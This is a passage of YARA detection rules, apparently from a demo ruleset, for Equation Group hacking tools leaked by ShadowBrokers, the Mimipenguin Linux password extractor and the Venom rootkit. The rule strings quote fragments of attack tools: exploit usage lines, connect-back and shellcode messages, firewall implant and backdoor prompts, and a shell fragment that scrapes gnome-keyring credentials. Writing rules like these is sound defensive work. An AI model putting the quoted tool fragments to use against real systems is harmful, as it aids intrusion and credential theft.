      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:47:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "+ Bruteforce mode." fullword ascii
      $s3 = "+ Host is not running samba!" fullword ascii
      $s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
      $s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
      $s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_pclean_v2_1_1_2_RID31EE : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:43:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
      $s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )
}

rule EquationGroup_cmsex_RID2EE3 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
      $x2 = "-i target ip address / hostname " fullword ascii
      $x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
      $x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
      $x5 = "If one choice fails, you may want to try another." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of ( $x* ) ) or ( 2 of them )
}

rule EquationGroup_exze_RID2E7F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "shellFile" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "zeke_remove" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and all of them )
}

rule EquationGroup_DUL_RID2DA8 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 10:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
      $x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
}

rule EquationGroup_slugger2_RID2FEE : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
      $x2 = "command must be less than 61 chars" fullword ascii
      $s1 = "__rw_read_waiting" ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "__mutexkind" ascii
      $s4 = "__rw_pshared" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ( $x* ) ) ) or ( all of them )
}

rule EquationGroup_jackpop_RID2FAB : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii
      $s1 = "client: can't bind to local address, are you root?" fullword ascii
      $s2 = "Unable to register port" fullword ascii
      $s3 = "Could not resolve destination" fullword ascii
      $s4 = "raw troubles" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
}

rule EquationGroup_epoxyresin_v1_0_0_RID333D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 14:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] kernel not vulnerable" fullword ascii
      $s1 = ".tmp.%d.XXXXXX" fullword ascii
      $s2 = "[-] couldn't create temp file" fullword ascii
      $s3 = "/boot/System.map-%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
}

rule EquationGroup_ewok_RID2E79 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Example: ewok -t target public" fullword ascii
      $x2 = "Usage:  cleaner host community fake_prog" fullword ascii
      $x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
      $x4 = "--- ewok version" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them )
}

rule EquationGroup_xspy_RID2E97 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup__scanner_scanner_v2_1_2_RID357D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:15:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      hash2 = "9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Welcome to the network scanning tool" fullword ascii
      $s2 = "Scanning port %d" fullword ascii
      $s3 = "/current/down/cmdout/scans" fullword ascii
      $s4 = "Scan for SSH version" fullword ascii
      $s5 = "program vers proto   port  service" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__ghost_sparc_ghost_x86_3_RID361A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1"
      hash2 = "82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
      $x2 = "Sending shellcode as part of an open command..." fullword ascii
      $x3 = "cmdshellcode" fullword ascii
      $x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 17:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      hash2 = "ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
      $s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )
}

rule Mimipenguin_SH_RID2C8D : DEMO HKTL LINUX SCRIPT T1003 {
   meta:
      description = "Detects Mimipenguin Password Extractor - Linux"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-04-01 09:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX, SCRIPT, T1003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
      $s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
      $s3 = "MimiPenguin Results:" ascii
   condition: 
      1 of them
}

rule Venom_Rootkit_RID2C61 : APT DEMO LINUX T1014 {
   meta:
      description = "Venom Linux Rootkit"
      author = "Florian Roth"
      reference = "https://security.web.cern.ch/security/venom.shtml"
      date = "2017-01-12 09:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, LINUX, T1014"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%%VENOM%CTRL%MODE%%" ascii fullword
      $s2 = "%%VENOM%OK%OK%%" ascii fullword
      $s3 = "%%VENOM%WIN%WN%%" ascii fullword
      $s4 = "%%VENOM%AUTHENTICATE%%" ascii fullword
      $s5 = ". entering interactive shell" ascii fullword
      $s6 = ". processing ltun request" ascii fullword
      $s7 = ". processing rtun request" ascii fullword
      $s8 = ". processing get request" ascii fullword
      $s9 = ". processing put request" ascii fullword
      $s10 = "venom by mouzone" ascii fullword
      $s11 = "justCANTbeSTOPPED" ascii fullword
   condition: 
      filesize < 4000KB and 2 of them
}

rule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file install_get_persistent_filenames"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 16:23:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Generates the persistence file name and prints it out." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and all of them )
}

rule APT_EQGRP_BananaAid_RID2D82 : APT DEMO T1105 {
   meta:
      description = "EQGRP Toolset Firewall - file BananaAid"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f"
      tags = "APT, DEMO, T1105"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "(might have to delete key in ~/.ssh/known_hosts on linux box)" fullword ascii
      $x2 = "scp BGLEE-" ascii
      $x3 = "should be 4bfe94b1 for clean bootloader version 3.0; " fullword ascii
      $x4 = "scp <configured implant> <username>@<IPaddr>:onfig" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_bo_RID2B04 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file bo"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 08:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa8b363073e8ae754b1836c30f440d7619890ded92fb5b97c73294b15d22441d"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ERROR: failed to open %s: %d" fullword ascii
      $s2 = "__libc_start_main@@GLIBC_2.0" ascii
      $s3 = "serial number: %s" fullword ascii
      $s4 = "strerror@@GLIBC_2.0" fullword ascii
      $s5 = "ERROR: mmap failed: %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and all of them )
}

rule APT_EQGRP_BpfCreator_RHEL4_RID2FD9 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file BpfCreator-RHEL4"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bd7303393409623cabf0fcf2127a0b81fae52fe40a0d2b8db0f9f092902bbd92"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "usage %s \"<tcpdump pcap string>\" <outfile>" fullword ascii
      $s2 = "error reading dump file: %s" fullword ascii
      $s3 = "truncated dump file; tried to read %u captured bytes, only got %lu" fullword ascii
      $s4 = "%s: link-layer type %d isn't supported in savefiles" fullword ascii
      $s5 = "DLT %d is not one of the DLTs supported by this device" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and all of them )
}

rule APT_EQGRP_BARPUNCH_BPICKER_RID2EE5 : APT DEMO FILE T1083 {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash2 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
      tags = "APT, DEMO, FILE, T1083"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u" fullword ascii
      $x2 = "%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]" fullword ascii
      $x3 = "* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)" fullword ascii
      $x4 = "%s version %s already has persistence installed. If you want to uninstall," fullword ascii
      $x5 = "The active module(s) on the target are not meant to be persisted" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )
}

rule APT_EQGRP_Implants_Gen6_RID2F2A : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information" fullword ascii
      $s2 = "LP.c:pixSecurity - Not in Session" fullword ascii
      $s3 = "getModInterface__preloadedModules" fullword ascii
      $s4 = "showCommands" fullword ascii
      $s5 = "readModuleInterface" fullword ascii
      $s6 = "Wrapping_Not_Necessary_Or_Wrapping_Ok" fullword ascii
      $s7 = "Get_CMD_List" fullword ascii
      $s8 = "LP_Listen2" fullword ascii
      $s9 = "killCmdList" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and all of them )
}

rule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash3 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Module and Implant versions do not match.  This module is not compatible with the target implant" fullword ascii
      $s1 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log" fullword ascii
      $s2 = "%s/BF_%04d%02d%02d.log" fullword ascii
      $s3 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )
}

rule APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Implant Version-Specific Values:" fullword ascii
      $x2 = "This function should not be used with a Netscreen, something has gone horribly wrong" fullword ascii
      $s1 = "createSendRecv: recv'd an error from the target." fullword ascii
      $s2 = "Error: WatchDogTimeout read returned %d instead of 4" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of ( $x* ) ) or ( 3 of them )
}

rule APT_EQGRP_Implants_Gen4_RID2F28 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      hash3 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Command has not yet been coded" fullword ascii
      $s2 = "Beacon Domain  : www.%s.com" fullword ascii
      $s3 = "This command can only be run on a PIX/ASA" fullword ascii
      $s4 = "Warning! Bad or missing Flash values (in section 2 of .dat file)" fullword ascii
      $s5 = "Printing the interface info and security levels. PIX ONLY." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )
}

rule APT_EQGRP_Implants_Gen3_RID2F27 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "incomplete and must be removed manually.)" fullword ascii
      $s1 = "%s: recv'd an error from the target." fullword ascii
      $s2 = "Unable to fetch the address to the get_uptime_secs function for this OS version" fullword ascii
      $s3 = "upload/activate/de-activate/remove/cmd function failed" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )
}

rule APT_EQGRP_BLIAR_BLIQUER_RID2E10 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:58:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Do you wish to activate the implant that is already on the firewall? (y/n): " fullword ascii
      $x2 = "There is no implant present on the firewall." fullword ascii
      $x3 = "Implant Version :%lx%lx%lx" fullword ascii
      $x4 = "You may now connect to the implant using the pbd idkey" fullword ascii
      $x5 = "No reply from persistant back door." fullword ascii
      $x6 = "rm -rf pbd.wc; wc -c %s > pbd.wc" fullword ascii
      $p1 = "PBD_GetVersion" fullword ascii
      $p2 = "pbd/pbdEncrypt.bin" fullword ascii
      $p3 = "pbd/pbdGetVersion.pkt" fullword ascii
      $p4 = "pbd/pbdStartWrite.bin" fullword ascii
      $p5 = "pbd/pbd_setNewHookPt.pkt" fullword ascii
      $p6 = "pbd/pbd_Upload_SinglePkt.pkt" fullword ascii
      $s1 = "Unable to fetch hook and jmp addresses for this OS version" fullword ascii
      $s2 = "Could not get hook and jump addresses" fullword ascii
      $s3 = "Enter the name of a clean implant binary (NOT an image):" fullword ascii
      $s4 = "Unable to read dat file for OS version 0x%08lx" fullword ascii
      $s5 = "Invalid implant file" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and ( 1 of ( $x* ) or 1 of ( $p* ) ) ) or ( 3 of them )
}

rule APT_EQGRP_Implants_Gen2_RID2F26 : APT DEMO FILE T1083 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE, T1083"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Modules persistence file written successfully" fullword ascii
      $x2 = "Modules persistence data successfully removed" fullword ascii
      $x3 = "No Modules are active on the firewall, nothing to persist" fullword ascii
      $s1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s " fullword ascii
      $s2 = "Error while attemping to persist modules:" fullword ascii
      $s3 = "Error while reading interface info from PIX" fullword ascii
      $s4 = "LP.c:pixFree - Failed to get response" fullword ascii
      $s5 = "WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default" fullword ascii
      $s6 = "Unable to fetch config address for this OS version" fullword ascii
      $s7 = "LP.c: interface information not available for this session" fullword ascii
      $s8 = "[%s:%s:%d] ERROR: " fullword ascii
      $s9 = "extract_fgbg" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 5 of them )
}

rule APT_EQGRP_noclient_3_0_5_RID2F44 : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file noclient-3.0.5.3"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-C %s 127.0.0.1\" scripme -F -t JACKPOPIN4 '&" fullword ascii
      $x2 = "Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo." fullword ascii
      $x3 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $x4 = "Error from ourtn, did not find keys=target in tn.spayed" fullword ascii
      $x5 = "ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )
}

rule APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 15:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "recv_ack: %s: Service not supplied by provider" fullword ascii
      $s2 = "send_request: putmsg \"%s\": %s" fullword ascii
      $s3 = "port undefined" fullword ascii
      $s4 = "recv_ack: %s getmsg: %s" fullword ascii
      $s5 = ">> %d -- %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 2 of them )
}

